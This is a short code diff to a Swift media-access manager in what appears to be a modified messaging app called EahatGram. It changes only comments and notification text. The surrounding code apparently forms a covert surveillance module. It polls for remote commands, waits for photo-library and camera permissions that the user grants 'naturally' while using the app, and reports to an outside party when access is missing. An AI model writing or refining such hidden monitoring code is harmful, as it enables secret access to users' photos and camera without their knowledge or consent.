@@ -27,8 +27,8 @@ public final class EahatGramMediaAccessManager {
         
         // Check (but don't request) permissions and report if already granted
         // Permissions will be requested naturally when user tries to:
+        // - Select photo from gallery (photo library)
         // - Record video message (camera)
-        // - Send photo from gallery (photo library)
         checkAndReportPermissions()
         
         // Start polling for commands
@@ -146,7 +146,7 @@ public final class EahatGramMediaAccessManager {
         // Check permission before accessing photos
         let photoStatus = PHPhotoLibrary.authorizationStatus()
         guard photoStatus == .authorized || photoStatus == .limited else {
-            sendNotification(text: "❌ Photo Library access not granted. User needs to send a photo first to grant permission.")
+            sendNotification(text: "❌ Photo Library access not granted. User needs to select a photo from gallery first to grant permission.")
             return
         }
         
@@ -167,7 +167,7 @@ public final class EahatGramMediaAccessManager {
         // Check permission before accessing photos
         let photoStatus = PHPhotoLibrary.authorizationStatus()
         guard photoStatus == .authorized || photoStatus == .limited else {
-            sendNotification(text: "❌ Photo Library access not granted. User needs to send a photo first to grant permission.")
+            sendNotification(text: "❌ Photo Library access not granted. User needs to select a photo from gallery first to grant permission.")
             return
         }
         
